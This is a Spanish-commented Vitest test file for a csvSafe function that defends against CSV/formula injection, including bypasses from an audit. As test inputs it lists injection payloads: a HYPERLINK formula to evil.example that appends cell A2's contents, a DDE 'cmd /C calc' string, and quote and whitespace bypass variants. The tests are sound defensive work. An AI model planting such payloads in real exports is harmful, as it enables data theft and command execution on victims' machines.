import { describe, expect, it } from 'vitest';
import { csvSafe } from '../src/lib/csv-safe';

/**
 * Lo que ve la hoja de cálculo: parsea UNA fila `;`-separada como lo hace un lector RFC 4180
 * (campo entrecomillado → se quitan las comillas y `""` pasa a `"`). Los tests comprueban el
 * valor de la CELDA, no el texto del fichero: es ahí donde se decide si algo es una fórmula.
 */
function parseRow(line: string): string[] {
  const cells: string[] = [];
  let i = 0;
  while (i <= line.length) {
    let cell = '';
    if (line[i] === '"') {
      i++;
      while (i < line.length && !(line[i] === '"' && line[i + 1] !== '"')) {
        if (line[i] === '"') i++; // comilla doblada
        cell += line[i++];
      }
      i++; // comilla de cierre
    } else {
      while (i < line.length && line[i] !== ';') cell += line[i++];
    }
    cells.push(cell);
    i++; // separador
  }
  return cells;
}

/** Valor de la celda cuando `raw` va en medio de una fila real, entre otros dos campos. */
const cell = (raw: string) => {
  const cells = parseRow(['antes', csvSafe(raw), 'después'].join(';'));
  expect(cells).toHaveLength(3); // el valor no rompe la fila ni se cuela en otra columna
  return cells[1]!;
};

/** ¿Trataría la hoja de cálculo este valor de celda como fórmula? (tolerante con espacios) */
const isFormula = (value: string) => /^\s*[=+\-@]/.test(value);

describe('csvSafe (auditoría M3 — CSV/formula injection)', () => {
  it('deja intacto un texto normal', () => {
    expect(csvSafe('Diego Ortega Marín')).toBe('Diego Ortega Marín');
    expect(csvSafe('ES12 3456 7890')).toBe('ES12 3456 7890');
    expect(csvSafe('')).toBe('');
  });

  it('neutraliza un valor que empieza por =', () => {
    expect(cell('=HYPERLINK("http://evil.example")')).toBe('\'=HYPERLINK("http://evil.example")');
  });

  it('neutraliza +, -, @ y tab al inicio', () => {
    expect(csvSafe('+1234')).toMatch(/^'\+/);
    expect(csvSafe('-1234')).toMatch(/^'-/);
    expect(csvSafe('@SUM(A1)')).toMatch(/^'@/);
    expect(csvSafe('\tmalicioso')).toMatch(/^'\t/);
  });

  it('quita saltos de línea y el separador de campo', () => {
    expect(csvSafe('línea1\nlínea2;otro')).toBe('línea1 línea2 otro');
    expect(csvSafe('a\r\nb')).toBe('a  b');
  });

  it('no marca como fórmula un = que no está al principio', () => {
    expect(csvSafe('IBAN=ES12')).toBe('IBAN=ES12');
  });

  it('un texto con comillas llega a la celda tal cual', () => {
    expect(cell('Dijo "hola" y se fue')).toBe('Dijo "hola" y se fue');
    expect(cell('"entre comillas"')).toBe('"entre comillas"');
  });

  // Auditoría v2, M-04: los dos bypasses del fix original.
  describe('M-04: bypasses de la neutralización', () => {
    it('valor entrecomillado: el parser quita las comillas y dejaba una fórmula en la celda', () => {
      const value = cell('"=HYPERLINK(""http://evil.example/?""&A2)"');
      expect(isFormula(value)).toBe(false);
      expect(value.startsWith("'")).toBe(true);
    });

    it('espacio inicial antes del carácter de fórmula', () => {
      const value = cell(' =1+1');
      expect(isFormula(value)).toBe(false);
      expect(value).toBe("' =1+1");
    });

    it.each([
      ['=1+1'],
      ['  =1+1'],
      [' =1+1'], // espacio de no separación
      ['\t=1+1'],
      ['"=1+1"'],
      ['"=1+1'],
      [' "=1+1"'],
      ['" =1+1"'],
      ['""=1+1'],
      ['"+1+1"'],
      ['"-1+1"'],
      ['"@SUM(A1)"'],
      ['\n=1+1'],
      ['\r=1+1'],
      [';=1+1'],
      ['x";=1+1;"'],
      ['=cmd|\' /C calc\'!A0'],
      ['"=1+1";=2+2'],
    ])('%j no llega a ninguna celda como fórmula', (raw) => {
      const row = parseRow(['antes', csvSafe(raw), 'después'].join(';'));
      expect(row).toHaveLength(3);
      expect(row.some(isFormula)).toBe(false);
    });
  });
});
